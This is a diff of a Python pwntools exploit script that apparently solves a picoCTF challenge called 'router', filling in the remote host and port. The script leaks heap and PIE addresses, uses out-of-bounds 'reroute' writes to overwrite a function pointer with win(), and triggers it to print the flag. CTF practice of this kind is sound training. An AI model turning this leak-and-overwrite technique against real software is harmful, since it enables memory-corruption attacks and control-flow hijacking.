@@ -244,10 +244,11 @@ dispatch 17
 #!/usr/bin/env python3
 import re
 from pwn import *
+# helper functions written with AI to save time
 
 context.log_level = "debug"
-HOST = "" # enter remote host here
-PORT = 0 # enter remote port here
+HOST = "mysterious-sea.picoctf.net" # enter remote host here
+PORT = 55435 # enter remote port here
 PROMPT = b"router> "
 elf = ELF("./router", checksec=False)
 
@@ -268,43 +269,23 @@ def s32(x):
     return x - 0x100000000 if x & 0x80000000 else x
 # used to convert an unsigned integer into a signed integer
 
-def run_exploit():
-    io = remote(HOST, PORT)
-    try:
-        io.recvuntil(PROMPT)
-        cmd(io, "add_order 1 1") # add initial order with x and y as 1
-        heap_struct_base = leak(cmd(io, "receipt 0"), "hint") # leak heap address
-        fx_draw_basic = leak(cmd(io, "replay 0"), "renderer") # leak PIE address
-        pie_base = fx_draw_basic - elf.sym["fx_draw_basic"] # calculate PIE base from PIE leak
-        ord0 = pie_base + elf.sym["ORD"] # calculate start of the ORD array using the leaked PIE base
-        win = pie_base + elf.sym["win"] # calculate the address of the win() function using the leaked PIE base
-        lsb32_win = win & 0xFFFFFFFF # get the 32 LSB (4 least significant bytes)
-        calculated_heap_idx_1 = s32((ord0 - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the beginning of the ORD array
-        cmd(io, f"reroute 0 {calculated_heap_idx_1} {s32(lsb32_win - 16)}") # writes the new_cost value that makes dst_x in ORD[0] the exact value that results in order->dst_y * G.width + order->dst_x evaluating to the 32 LSB of win()
-        calculated_heap_idx_2 = s32(((heap_struct_base + 0x430) - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the fx_draw_basic() function pointer stored on the heap
-        cmd(io, f"reroute 17 {calculated_heap_idx_2} {win >> 32}") # references index 17 instead of index 0 because of the overwritten index value and passes in win >> 32 as the new_cost value (msb32_win) as this will be the 4 most significant bytes of the win() address
-        dispatch = cmd(io, "dispatch 17") # dispatch operation excutes the code, specifically at the address we just overwrote to win(), which therefore prints the flag
-        flag = re.search(r"flag\{[^}]+\}", dispatch) # get the flag
-        if not flag:
-            return None
-        return {
-            "flag": flag.group(0),
-            "heap_struct_base": heap_struct_base,
-            "pie_base": pie_base,
-            "ord0": ord0,
-            "win": win
-        }
-    finally:
-        io.close()
-
 def main():
-	try:
-	    result = run_exploit()
-	except Exception:
-	    result = None
-	if result:
-	    print(result)
-	    return
+    io = remote(HOST, PORT)
+    io.recvuntil(PROMPT)
+    cmd(io, "add_order 1 1") # add initial order with x and y as 1
+    heap_struct_base = leak(cmd(io, "receipt 0"), "hint") # leak heap address
+    fx_draw_basic = leak(cmd(io, "replay 0"), "renderer") # leak PIE address
+    pie_base = fx_draw_basic - elf.sym["fx_draw_basic"] # calculate PIE base from PIE leak
+    ord0 = pie_base + elf.sym["ORD"] # calculate start of the ORD array using the leaked PIE base
+    win = pie_base + elf.sym["win"] # calculate the address of the win() function using the leaked PIE base
+    lsb32_win = win & 0xFFFFFFFF # get the 32 LSB (4 least significant bytes)
+    calculated_heap_idx_1 = s32((ord0 - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the beginning of the ORD array
+    cmd(io, f"reroute 0 {calculated_heap_idx_1} {s32(lsb32_win - 16)}") # writes the new_cost value that makes dst_x in ORD[0] the exact value that results in order->dst_y * G.width + order->dst_x evaluating to the 32 LSB of win()
+    calculated_heap_idx_2 = s32(((heap_struct_base + 0x430) - (heap_struct_base + 0x18)) // 8) # calculate the value of heap_idx that results in the arbitrary write being moved to the fx_draw_basic() function pointer stored on the heap
+    cmd(io, f"reroute 17 {calculated_heap_idx_2} {win >> 32}") # references index 17 instead of index 0 because of the overwritten index value and passes in win >> 32 as the new_cost value (msb32_win) as this will be the 4 most significant bytes of the win() address
+    dispatch = cmd(io, "dispatch 17") # dispatch operation excutes the code, specifically at the address we just overwrote to win(), which therefore prints the flag
+    print(dispatch)
+    io.interactive()
 
 if __name__ == "__main__":
     main()
